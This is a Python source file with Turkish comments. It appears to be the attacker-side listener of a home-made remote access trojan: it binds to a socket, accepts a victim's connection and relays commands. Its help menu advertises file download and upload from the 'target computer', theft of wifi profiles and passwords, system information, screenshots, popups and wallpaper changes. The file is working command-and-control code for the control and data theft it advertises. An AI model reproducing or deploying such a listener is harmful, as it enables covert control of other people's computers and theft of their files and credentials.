import socket
import subprocess
import simplejson
import base64
from pyfiglet import Figlet
from termcolor import colored
import ctypes



class SocketListener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #dinleyicimizi birden fazla kullanıma ayarladık. Yani artık tek seferlik değil.
        listener.bind((ip,port)) #windowstaki gibi bağlantı(windowsta bağlantının gideceği ip'yi verdik).bizim bilgisayara geldiğinden bizim ipmiz.(bizimkine bağlantı geleceğinden yine bizim ip)
        listener.listen(0)
        format=Figlet(font="bubble")
        print(colored("Bağlantı bekleniyor ==> ",color="green"))
        (self.gelen_baglanti,gelen_baglanti_adresi)=listener.accept()
        print(colored(str(gelen_baglanti_adresi) +" ile bağlantı kurulduu :))",color="green"))

    def json_send(self,data):
        json_data=simplejson.dumps(data) #datayı json_data'nın içine aldık.
        self.gelen_baglanti.send(json_data.encode("utf-8")) #açtığımız bağlantıyı kullanarak json_datayı gönderdik.

    def json_receiver(self):
        json_data=""
        while True:
            try:
                json_data=json_data + self.gelen_baglanti.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def duvar_kagidi(self,path):

       komut="ctypes.windll.user32.System.parameter.INFOW(20,0,path,0)"



        

    def help(self):
        f=Figlet(font='slant')
        print(colored(f.renderText('YARDIM MENUSU'),color="blue"))

        print(colored("1-)",color= "green"),colored("ipconfig ::",color="blue"),colored("Hedef bilgisayarın ip bilgilerini almaya yarar.",color="red"))
        print(colored("2-)", color="green"), colored("whoami ::", color="blue"),colored("Hedef bilgisayardaki kimliğimizi gösterir.", color="red"))
        print(colored("3-)", color="green"), colored("cd ::", color="blue"),colored("ChangeDirectory'dir.Hedef bilgisayarda bulunduğumuz konumu gösterir.", color="red"))
        print(colored("4-)", color="green"), colored("cd <Directory> ::", color="blue"),colored("Hedef bilgisayarda konum değiştirmeye yarar.", color="red"))
        print(colored("5-)", color="green"), colored("dir ::", color="blue"),colored("Hedef bilgisayarda bulunuduğumuz yerdeki verileri listeler.", color="red"))
        print(colored("6-)", color="green"), colored("download <directory> ::", color="blue"),colored("Hedef bilgisayardan veri almamızı sağlar.", color="red"))
        print(colored("7-)", color="green"), colored("upload <directory> ::", color="blue"),colored("Hedef bilgisayara veri göndermemizi sağlar.", color="red"))
        print(colored("8-)", color="green"), colored("wifi ::", color="blue"),colored("Hedef bilgisayardaki bütün wifi verilerini almamamızı sağlar.", color="red"))
        print(colored("9-)", color="green"), colored("wifi profil ::", color="blue"),colored("Hedef bilgisayardaki wifi profillerini almamızı sağlar.", color="red"))
        print(colored("10-)", color="green"), colored("wifi sifre <Name> ::", color="blue"),colored("Hedef bilgisayardan wifi profilinin şifresini almamızı sağlar. ", color="red"))
        print(colored("11-)", color="green"), colored("sistem ::", color="blue"),colored("Hedef bilgisayarın sistem bilgisini almamızı sağlar. ", color="red"))
        print(colored("12-)", color="green"), colored("wifi sifre <Name> ::", color="blue"),colored("Hedef bilgisayardan wifi profilinin şifresini almamızı sağlar. ", color="red"))
        print(colored("13-)", color="green"), colored("screenshot ::", color="blue"),colored("Hedef bilgisayarda ekran görüntüsü almamızı sağlar. ", color="red"))
        print(colored("14-)", color="green"), colored("alert  ::", color="blue"),colored("Hedef bilgisayarda uyarı mesajı çıkarmamızı sağlar. ", color="red"))
        print(colored("15-)", color="green"), colored("wallpaper <content>  ::", color="blue"),colored("Hedef bilgisayarın duvar kağıdını değiştirmemizi sağlar. ", color="red"))

        print(colored("16-)", color="green"), colored("quit ::", color="blue"),colored("Programı sonlandırır.", color="red"))



    def command_execution(self,command):
        self.json_send(command)  # komutu gönderdik
        if command[0] =="quit":
            print(colored("<======","green"), colored("PROGRAM KAPANIYOR","red"),colored("=====>","green"))

            self.gelen_baglanti.close() #eğer kullanıcı quit yazıp çıkmak istiyorsa önce bağlantıyı sonlandırıp programı kapatıyoruz.
            exit()

        return self.json_receiver()  # komutun hedefte döndürdüğü değeri aldık.

    def save_file(self,path,content): #yolu ve veriyi aldık.
        with open(path,"wb") as kaydedilen_veri:   #write binary 2lik sistemde kaydedilen_veri nin içine yazdık.
            kaydedilen_veri.write(base64.b64decode(content))
            return "Veri aktarimi basarili.."

    def upload(self,path):#göndermek istediğimiz dosyanın yolunu aldık, yani adı.
        with open(path,"rb") as file: #ikilik sistemde okuduk read binary, Hata olmaması için. ve file ile birlikte açtık.
            return base64.b64encode(file.read()) #ikilik sistemde okuduğumuz dosyayı encode ettik ve artık göndermeye hazır.

    def listener(self):
        while True:
            command_input = input(colored("Komutları girin==>","yellow"))
            command_input = command_input.split(" ") #split gelen komutu boşluktan itibaren 2'ye ayırır
            try:
                if command_input[0]=="upload":
                    gonderilecek_veri=self.upload(command_input[1])
                    command_input.append(gonderilecek_veri)

                if command_input[0]=="help":
                    self.help()
                    continue

                if command_input[0]=="wallpaper" and len(command_input)>1:
                    wallpaper=self.upload(command_input[1])
                    command_input.append(wallpaper)

                command_output= self.command_execution(command_input) #sınıfın içinde başka bir sınıfı çağırdık.
                if command_input[0] =="download" and "Hata!" not in command_output: #karşı taraftan hata gelmediği zaman(outputun içinde hata!) download yap dedik.
                    command_output= self.save_file(command_input[1],command_output)



            except Exception:#herhangi bir hata alınırsa program çökmesin diye try except kullandık.
                command_output="Hata!"

            print(command_output)



My_socket_listener=SocketListener("10.0.2.15",8080)  #oluşturduğumuz sınıftan bir nesne oluşturduk.Inıt fonksıyonunun içindekiler her nesnede oto
#otomatik oluşturulur. Yani yine init fonksiyonunu çağırmamıza gerek yok.
My_socket_listener.listener()#oluşturduğumuz nesnede dinleyiciyi çalıştırıyoruz.
#command execution fonksiyonu listener fonksiyonunun içinde otomatik çağırıldığından ayrıca çağırmaya gerek yoktur.



